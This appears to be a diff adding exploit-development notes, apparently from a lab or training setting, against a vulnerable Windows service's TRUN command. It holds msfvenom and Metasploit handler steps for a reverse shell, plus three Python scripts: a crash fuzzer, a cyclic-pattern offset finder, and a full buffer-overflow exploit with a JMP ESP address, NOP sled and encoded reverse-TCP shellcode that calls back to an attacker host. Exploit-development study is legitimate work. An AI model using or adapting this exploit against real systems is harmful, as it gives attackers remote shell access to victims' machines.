@@ -222,11 +222,101 @@ CMDS for Immunity Debugger: !mona modules
                             !mona jmp -r esp -m "essfunc.dll" -- Copy first JMP ESP address to clipboard
 
 
+In lin-ops: msfvenom -p windows/shell/reverse_tcp lhost=10.50.29.236 lport=4444 -b "\x00" -f python
+            msfconsole  -->  use multi/handler
+                             show options
+                             set payload windows/meterpreter/reverse_tcp
+                             set LHOST 0.0.0.0
+                             show options
+                             exploit  --  starts exploit
+           CLI: ./<buff script>.py    --  sends payload we created; a meterpreter session should start: if it doesn't, try again
+           meterpreter: shell         --  drops you into a shell on the box 
 
+buffows2.py:
+#!/usr/bin/python
 
+import socket
 
+buf = "TRUN /.:/"
+buf += "A" * 2003
+#JMP ESP 625011AF
+buf += "\xAF\x11\x50\x62"
+buf += "\x90" * 15   #NOP Sled
+buf += b"\xba\x73\xf2\xd9\xe2\xdb\xd3\xd9\x74\x24\xf4\x5e"
+buf += b"\x31\xc9\xb1\x59\x83\xee\xfc\x31\x56\x10\x03\x56"
+buf += b"\x10\x91\x07\x25\x0a\xda\xe8\xd6\xcb\x84\x61\x33"
+buf += b"\xfa\x96\x16\x37\xaf\x26\x5c\x15\x5c\xcd\x30\x8e"
+buf += b"\xd7\xa3\x9c\xa1\x50\x09\xfb\x8c\x61\xbc\xc3\x43"
+buf += b"\xa1\xdf\xbf\x99\xf6\x3f\x81\x51\x0b\x3e\xc6\x27"
+buf += b"\x61\xaf\x9a\x3c\xdb\x3f\x90\x01\xe0\x68\xa7\x55"
+buf += b"\x93\xd6\xdf\xd0\x64\xa2\x53\xda\xb4\xc1\x24\xc4"
+buf += b"\xbf\x8d\x94\xa4\xbe\xfe\x50\x8d\xb5\x3c\x12\x85"
+buf += b"\x02\xb7\xa5\x4f\x5b\x38\x94\xaf\x30\x07\x18\x22"
+buf += b"\x48\x40\x9f\xdd\x3f\xba\xe3\x60\x38\x79\x99\xbe"
+buf += b"\xcd\x9d\x39\x34\x75\x79\xbb\x99\xe0\x0a\xb7\x56"
+buf += b"\x66\x54\xd4\x69\xab\xef\xe0\xe2\x4a\x3f\x61\xb0"
+buf += b"\x68\x9b\x29\x62\x10\xba\x97\xc5\x2d\xdc\x70\xb9"
+buf += b"\x8b\x97\x93\xac\xac\x58\x6c\xd1\xf0\xce\xa0\x1c"
+buf += b"\x0b\x0e\xaf\x17\x78\x3c\x70\x8c\x16\x0c\xf9\x0a"
+buf += b"\xe0\x05\xed\xac\x3e\xad\x7e\x53\xbf\xcd\x57\x90"
+buf += b"\xeb\x9d\xcf\x31\x94\x76\x10\xbd\x41\xe2\x1a\x29"
+buf += b"\x60\xc0\x07\x45\x1c\x26\x38\x84\x81\xaf\xde\xf6"
+buf += b"\x69\xff\x4e\xb7\xd9\xbf\x3e\x5f\x30\x30\x60\x7f"
+buf += b"\x3b\x9b\x09\xea\xd4\x75\x61\x83\x4d\xdc\xf9\x32"
+buf += b"\x91\xcb\x87\x75\x19\xf9\x78\x3b\xea\x88\x6a\x2c"
+buf += b"\x8d\x72\x73\xad\x38\x72\x19\xa9\xea\x25\xb5\xb3"
+buf += b"\xcb\x01\x1a\x4b\x3e\x12\x5d\xb3\xbf\x22\x15\x82"
+buf += b"\x55\x0a\x41\xeb\xb9\x8a\x91\xbd\xd3\x8a\xf9\x19"
+buf += b"\x80\xd9\x1c\x66\x1d\x4e\x8d\xf3\x9e\x26\x61\x53"
+buf += b"\xf7\xc4\x5c\x93\x58\x37\x8b\xa7\x9f\xc7\x49\x80"
+buf += b"\x07\xaf\xb1\x90\xb7\x2f\xd8\x10\xe8\x47\x17\x3e"
+buf += b"\x07\xa7\xd8\x95\x40\xaf\x53\x78\x22\x4e\x63\x51"
+buf += b"\xe2\xce\x64\x56\x3f\xe1\x1f\x17\xc0\x02\xe0\x31"
+buf += b"\xa5\x03\xe0\x3d\xdb\x38\x36\x04\xa9\x7f\x8a\x33"
+buf += b"\xa2\xca\xaf\x12\x29\x34\xe3\x65\x78"
+#msfvenom -p windows/shell/reverse_tcp lhost=10.50.29.236 lport=4444 -b "\x00" -f python
 
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets
 
+s.connect(("10.50.39.5",9999)) #IP and port to connect to
+print s.recv(1024) #print response
+s.send(buf) #Sends the variable buf
+print s.recv(1024) #Print response
+s.close() #close the connection
+
+--
+buffows1.py:
+#!/usr/bin/python
+
+import socket
+
+buf = "TRUN /.:/"
+buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac.... This goes on for like 2500 characters"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets
+
+s.connect(("10.50.39.5",9999)) #IP and port to connect to
+print s.recv(1024) #print response
+s.send(buf) #Sends the variable buf
+print s.recv(1024) #Print response
+s.close() #close the connection
+
+--
+buffows.py:
+#!/usr/bin/python
+
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 2500
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets
+
+s.connect(("10.50.39.5",9999)) #IP and port to connect to
+print s.recv(1024) #print response
+s.send(buf) #Sends the variable buf
+print s.recv(1024) #Print response
+s.close() #close the connection
 
 
 
